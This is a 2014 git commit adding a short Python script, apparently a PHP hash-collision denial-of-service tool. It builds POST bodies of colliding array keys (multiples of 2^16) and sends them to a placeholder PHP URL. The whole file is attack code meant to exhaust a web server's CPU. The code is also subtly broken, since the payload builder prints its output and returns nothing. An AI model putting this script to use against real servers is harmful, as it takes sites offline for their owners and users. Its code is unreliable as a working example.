0618af22eea18c04384b64f3ca3ed59ce93a7902
empty_ <xilei125@163.com>
2014-07-05 18:37:00 +0800

    add hashcollisions

---
+++ phphacker/hashcollisions.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+__author__ = 'xilei'
+
+
+from urllib import request
+import math
+
+
+def build_data(length):
+    data = []
+    maxkey = (length-1)*length
+    key = 0
+    while key <= maxkey:
+        data.append(str(int(key)))
+        key = key + length
+    print('=0&'.join(data))
+
+
+def post(url, length=math.pow(2, 16)):
+    req = request.Request(url, build_data(length))
+    opener = request.build_opener()
+    return opener.open(req).read()
+
+
+if __name__ == "__main__":
+    print(post('http://www.xxxx.com/index.php'))
+    pass
